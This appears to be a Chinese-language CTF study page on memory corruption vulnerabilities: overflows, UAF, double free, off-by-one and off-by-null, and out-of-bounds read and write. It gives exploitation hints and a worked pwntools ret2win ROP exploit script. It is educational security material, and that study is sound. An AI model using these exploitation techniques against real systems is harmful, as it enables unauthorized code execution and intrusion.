---
comments: true
---

# 内存破坏漏洞

> PWN · 知识域。基础内存错误类 bug 的识别与利用入口。标签:**内存未初始化**、**内存溢出**、**off-by-one**、**off-by-null**、**内存越界写**、**内存越界读**。

## 触发特征

- `gets/scanf/read` 无长度检查;循环边界 `<=`;数组索引可控。
- 菜单题 index 未校验、结构体指针偏移错。

## 内存未初始化

- 栈/堆变量未初始化即使用 → 残留值泄露(`%p` 不需要,直接打印);残留 chunk 指针泄露堆/libc 地址(picoCTF 2018)。
- 利用:先"养"内存(把目标值留在槽位)再触发读取。
- calloc 与 malloc 差异(calloc 清零)是出题对比点。

## 内存溢出

- 栈溢出基础:offset 计算(cyclic 找返回地址偏移)、16 字节栈对齐(movaps)、参数寄存器布局(x86_64: rdi rsi rdx)。
- 结构体指针覆写(菜单堆题:全局指针数组越界改结构体字段)。
- 负数数量绕过(有符号比较):买负数个物品反向溢出。
- **整数溢出**:有符号/无符号边界(`INT_MAX+1` 环绕)、运算顺序截断(int32→int16)——溢出的结果被当作长度/索引时转化为越界写(→ [逻辑漏洞](logic-vuln.md) 类型混淆的整数语义节)。
- 全局缓冲区溢出(CSV 注入类:全局数组行溢出)。

## UAF / Double Free(生命周期类内存破坏)

- **UAF(Use-After-Free)**:free 后指针未置空 → 释放块内容可控(写入函数指针/伪造对象)后被复用;堆上下文全谱系 → [堆漏洞利用](heap-exploit.md);解释器/对象模型里的 UAF(→ [其他类型PWN](other-pwn.md) 解释器PWN)。
- **Double Free**:同一 chunk 释放两次 → tcache/fastbin 链表被破坏形成任意分配(2.29+ 需绕 key 检测,→ [堆漏洞利用](heap-exploit.md) tcache double free)。
- 生命周期类共同点:破坏不在"写越界",而在"对象状态机错乱"——排查时盯 free 后指针处置与所有权转移。

## 内存泄露(信息泄露型)

- 未初始化读取:栈/堆残值打印(见上节);free 后 chunk 残留指针复读。
- 越界读泄露:GOT/栈/libc/canary/堆地址(→ 内存越界读节)。
- "内存泄露"在 pwn 语境 = 泄露内存中的敏感地址信息,是所有利用链的前置原语。

## off-by-one

- 循环写 `i <= n`、`strcpy` 末尾 NUL 多写一字节。
- 利用:改相邻 chunk size 的 LSB(→ [堆漏洞利用](heap-exploit.md) off-by-one null byte 套路)、PIE 同页函数指针单字节改(返回地址低字节指到同页目标,P.W.N. CTF 2018)。

## off-by-null

- `strcpy`/`strncpy(dst,src,n)` 截断空字节恰好越界写 null。
- 经典后果:chunk size 高字节清零 → 堆块重叠/合并(House of Einherjar,→ [堆漏洞利用](heap-exploit.md))。
- 8 位循环计数器 1 字节溢出(srdnlenCTF 2026)。

## 内存越界写

- **索引仅校验上限**或步长越界:stride OOB(写入速率累计器配合函数指针递增,Codegate 2019)。
- **负索引**:有符号 index 传负值打到前方 GOT(P.W.N. CTF 2018);`abs(INT_MIN)` 为负的 bloom filter 负下标写(DragonCTF Teaser 2018)。
- 越界写函数指针表:rdx·8 受控索引读调度表(TAMUctf 2019)。
- 协议长度字段栈溢出(EKOPARTY CTF 2016);未检查 memcpy 长度的解析器栈溢出(MetaCTF Flash 2026)。

## 内存越界读

- stride/速率泄露 OOB 读(DiceCTF 2026);游戏 AI 均值越界读(BSidesSF 2024)。
- 越界读 GOT/栈残值 → 泄露 libc/PIE/canary,衔接其他知识域。
- CRC oracle 当任意读(ASIS CTF 2017)。

## 工具速查

```python
from pwn import *
payload = cyclic(200); # 崩溃后 cyclic_find(崩溃值) 得 offset
p.sendline(payload)
```

## 转向

- 栈上溢出 → [栈漏洞利用](stack-exploit.md);堆上 → [堆漏洞利用](heap-exploit.md);溢出点是 printf → [格式化字符串](format-string.md)

## 例题

### ret2win + 魔法值参数(经典起步题)

win 函数校验参数后才打 flag——溢出后经 `pop rdi` 传入魔数:

```python
from pwn import *
# 定位:Ghidra 找 fopen("flag.txt") 且无交叉引用、比对参数的函数
pop_rdi_ret = 0x40150b   # pop rdi; ret
ret         = 0x40101a   # 裸 ret(对齐用)
win_func    = 0x4013ac
magic       = 0x1337c0decafebeef
offset      = 112 + 8    # cyclic 测出返回地址偏移

payload = b'A' * offset
payload += p64(ret)                 # 16 字节栈对齐
payload += p64(pop_rdi_ret) + p64(magic) + p64(win_func)
p.sendline(payload)
```

流程模板:`cyclic 200` → 崩溃取回显值 `cyclic -l` 得 offset → `checksec` 看保护 → 无 PIE 无 canary 直接 ROP。

### 栈对齐崩溃排查

payload 全对但 `win` 里 `printf` 崩在 movaps:返回地址前补一个裸 `ret`(8 字节)把 rsp 拉回 16 对齐——Ubuntu/glibc 16 字节对齐要求的经典现象,先查这个再怀疑别的。
